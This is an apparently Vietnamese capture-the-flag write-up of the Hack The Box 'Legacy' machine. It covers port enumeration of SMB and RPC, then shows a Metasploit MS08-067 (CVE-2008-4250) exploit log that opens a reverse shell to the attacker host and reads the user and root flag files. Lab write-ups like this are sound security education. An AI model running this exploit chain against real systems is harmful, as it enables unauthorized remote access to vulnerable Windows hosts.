---
title: "Legacy HTB"
excerpt: "December 02, 2024 04:00 PM ICT to December 02, 2024"


header:
show_date: true
header:
  teaser: "../assets/images/images-icon/legacy.jpg"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/lame.jpg"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

# Legacy

![image](https://hackmd.io/_uploads/SJa82-3XJl.png)


![image](https://hackmd.io/_uploads/Sy0x6Zn7yg.png)

Machine về window easy:

![image](https://hackmd.io/_uploads/r1EB0-hQkx.png)

![image](https://hackmd.io/_uploads/B1UICW3Xye.png)

```
135/tcp

Trạng thái: Open
Dịch vụ: Microsoft Windows RPC
RPC (Remote Procedure Call) là một giao thức thường được sử dụng để thực thi chương trình trên máy tính từ xa. Có thể kiểm tra thêm để tìm lỗ hổng liên quan đến DCOM hoặc MSRPC.
139/tcp

Trạng thái: Open
Dịch vụ: NetBIOS Session Service (netbios-ssn)
Đây là một phần của giao thức NetBIOS, thường được sử dụng để chia sẻ tệp/tài nguyên. Có thể kiểm tra các chia sẻ không bảo mật hoặc lỗi SMB (Server Message Block).
445/tcp

Trạng thái: Open
Dịch vụ: Microsoft-ds (SMB)
SMB là giao thức phổ biến cho chia sẻ tệp và máy in trên mạng. Lưu ý:
SMB1 (phiên bản cũ) đang được sử dụng, thường dễ bị tấn công như EternalBlue hoặc các lỗ hổng tương tự.
Message Signing: Bị tắt (rủi ro bảo mật, dễ bị tấn công MITM).
```

https://www.getastra.com/blog/security-audit/how-to-hack-windows-xp-using-metasploit-kali-linux-ms08067/

ta thấy rpc được mở có khả năng bị khai thác với `CVE-2008-4250`:


![image](https://hackmd.io/_uploads/HJkrEznQyl.png)

```
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.45:4444
[*] 10.129.243.103:445 - Automatically detecting the target...
[*] 10.129.243.103:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.129.243.103:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.129.243.103:445 - Attempting to trigger the vulnerability...
[*] Command shell session 5 opened (10.10.14.45:4444 -> 10.129.243.103:1036) at 2024-12-03 12:13:56 +0700


Shell Banner:
Microsoft Windows XP [Version 5.1.2600]
-----


C:\WINDOWS\system32>cd "C:\Documents and Settings\john\Desktop"
cd "C:\Documents and Settings\john\Desktop"

C:\Documents and Settings\john\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  08:19 ��    <DIR>          .
16/03/2017  08:19 ��    <DIR>          ..
16/03/2017  08:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.296.608.768 bytes free

C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f
C:\Documents and Settings\john\Desktop>cd "C:\Documents and Settings\Administrator\Desktop"
cd "C:\Documents and Settings\Administrator\Desktop"

C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
C:\Documents and Settings\Administrator\Desktop>

```


## cheat

`cd "C:\Documents and Settings\Administrator\Desktop"`

`cd "C:\Documents and Settings\john\Desktop"`

`type file.txt` -> read file
